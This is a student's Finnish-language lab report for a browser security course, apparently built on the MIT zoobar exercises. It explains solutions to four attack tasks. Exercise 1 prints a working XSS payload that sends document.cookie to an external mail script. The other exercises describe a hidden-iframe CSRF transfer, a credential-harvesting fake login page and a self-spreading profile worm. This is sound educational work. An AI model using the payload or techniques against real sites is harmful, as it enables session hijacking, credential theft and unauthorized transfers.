# ITKST53 - Browser Security

**Tekijä:** Lauri Pimiä (lailpimi)

**Perustelut:** Jokaisen neljästä tehtävästä pitäisi toimia kuten pitää,
eli odottaisin saavani 3.5p. Jokaisen neljän tehtävän testit menevät läpi ja kuvat vastaavat mielestäni malleja (HUOM! Minun piti poistaa kuvat tästä paketista, koska ne tekivät tar.gz paketista liian ison palautusjärjestelmälle).

Tämän harjoituksen tehtävät olivat mielestäni huomattavasti mukavampia verrattuna edelliseen, jonka tein (JavaScript Sandboxing). Eniten aikaa minulla meni tehtävässä 3, muut tehtävät sujuivat aika nopeasti.

## Exercise 1
Tämä oli ylivoimaisesti nopein näistä tehtävistä. Vastauksessa (answer-1.txt) URL on koodattu, mutta dekoodasin sen parametriosion vielä tähän:
`
user="size=10><script>(new Image()).src='https://css.csail.mit.edu/6.858/2014/labs/sendmail.php?' + 'to=lailpimi@student.jyu.fi' + '&payload=' + encodeURIComponent(document.cookie) + '&random=' + Math.random();</script><style>.warning{display:none}</style><br
`
Hyödynnämme siis "user"-kentän haavoittuvuutta. Parametri "size" palauttaa kentän takaisin normaalin kokoiseksi, jonka jälkeen käytetään ohjeen emailskriptiä. HUOM! tämä skripti ei salli student.jyu.fi osoitteita, joten se palauttaa 403, mutta oikean payloadin voi tarkistaa esim. inspektorilla. URL:ssa on myös mukana koodia, joka piilottaa punaisen varoitustekstin. Lopussa oleva avonainen br-tagi piilottaa tuon "size=10 syötteen.

## Exercise 2
Tämä oli myös aika nopea tehdä, lähinnä aikaa kului iframen toiminnan muistelemisessa. Vastauksessa siis luon näkymättömän kopion oikeasta transfer-lomakkeesta valmiiksi täytettynä. Lomake suoritetaan sitten sivun latautumisen jälkeen iframessa, jotta osoitepalkki säilyy ohjeiden mukaisena.

## Exercise 3
Tässä tehtävässä minulla kesti pisimpään, koska en keksinyt miten saisin tiedon siitä, onko käyttäjä kirjautunut jo sisään. Tähän oli hieno vinkki tehtävänannossa, mutta onnistuin jotenkin ohittamaan sen :). Ehdin yrittämään jo kaikelaista mm. cookieilla kunnes huomasin kyseisen vinkin, jonka jälkeen löysin tuon zoobarjs-tiedoston koodia selaamalla. Itse tehtävän koodi oli helppo toteuttaa. Kopioin ensin login-sivun html:n, lisäsin tarkistuksen ja uudelleenohjauksen jos käyttäjä on jo kirjautunut ja sitten lisäsin onsubmit-funktion lomakkeeseen, joka keräsi tunnukset ja lähettää ne samaa email-skriptiä käyttäen. Minun piti tehdä yksi iframe, jotta sain skriptille lähetyspohjan. Itse kirjautumistiedot menevät myös "oikealle" lomakkeelle, joten käyttäjän "oikea" kirjautuminen tapahtuu automaattisesti.

## Exercise 4
Aloitin tämän luomalla ensin profiilielementin + tuon ohjeen '**Scanning for viruses...**'. Sitten lisäsin 1 zoobarin siirron johon uudelleenkäytin T2 koodia. Tällä kertaa luin myös ohjeet tarkemmin, joissa oli vinkattu miten iframella pääsee käsiksi iframen sisällä olevaan domiin. Tässä ratkaisussa on siis kaksi iframea, yksi zoobar siirrolle ja toinen profiilin siirrolle. Kopioin profiilin iframen ylitse asettamalla profiilisivun teksti-boxiin profiilielementin outerHTML-attribuutin tulosteen (joka käytännössä tuottaa html-version mutta tekstinä). Sitten kyseinen lomake vain lähetetään samaan tapaan kuten zoobarien siirrossa. Nyt uhrilla on identtinen profiili alkuperäisen hyökkääjän kanssa. Tehtävään kuului myös siirto-login piilotus ja zoobarien pitäminen aina 10:ssä, kun katsottiin saastunutta profiilia. Zoobarien määrään pystyi vaikuttamaan total muuttujalla, jonka perusteella alkuperäinen sivu sai zoobar tiedon.

## Challenge
En vastannut tähän tehtävään, koska se ei kuulunut 3.5p suoritukseen.